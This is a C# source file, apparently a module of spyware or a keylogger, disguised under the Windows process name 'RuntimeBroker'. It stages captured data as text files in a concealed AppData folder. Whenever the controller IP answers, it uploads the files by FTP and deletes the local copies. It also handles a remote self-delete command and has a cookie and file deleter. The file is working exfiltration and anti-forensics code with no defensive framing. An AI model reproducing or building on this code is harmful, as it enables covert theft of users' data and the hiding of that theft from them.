using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RuntimeBroker
{
    internal class _file
    {
        private _ftp ftp = new _ftp(); //FTP Client instance (upload, check (command system)).
        private _deleter del = new _deleter(); //Deleter instance (cookies, files).
        private _addons addons = new _addons(); //Addons (everything else) instance.
        private bool pingedbefore; //check if ping before was okay or not.
        internal void decide(Main instance, String filename, String data){
            write(data, filename);
            if(addons.isOnline(instance.ip))
            {
                if (pingedbefore)
                {
                    online(instance, filename);
                    File.Delete(addons.getPath(filename));
                }
                else beenoff(instance);
                pingedbefore = true;
            }else
            {
                pingedbefore = false;
            }
        }   
        private void online(Main instance, String filename)
        {
            //if pinged okay and haven't been offline.
            if (!ftp.check(instance)) ftp.upload(instance, filename, addons.getPath(filename));
            else addons.deleteItself(instance);
        }
        private void beenoff(Main instance){
            DirectoryInfo dinfo = new DirectoryInfo(String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\lochoproc\", Environment.UserName));
            FileInfo[] files = dinfo.GetFiles("*.txt");
            List<string> fileslist = new List<string>();
            foreach (var file in files)
            {
                fileslist.Add(file.Name);
            }
            for (int i = 0; i < fileslist.Count; i++)
            {
                if (fileslist[i].Contains(".txt"))
                {
                    online(instance, fileslist[i]);
                    File.Delete(addons.getPath(fileslist[i]));
                }
            }
        }
        private void write(String data, String filename){
            if (data.Length == 0)
            {
                data = "none (Nothing has been written)";
            }
            var fStream = File.Create(addons.getPath(filename));
            byte[] toWrite = new UTF8Encoding(true).GetBytes(data);
            fStream.Write(toWrite, 0, toWrite.Length);
            fStream.Close();
        }
    }
}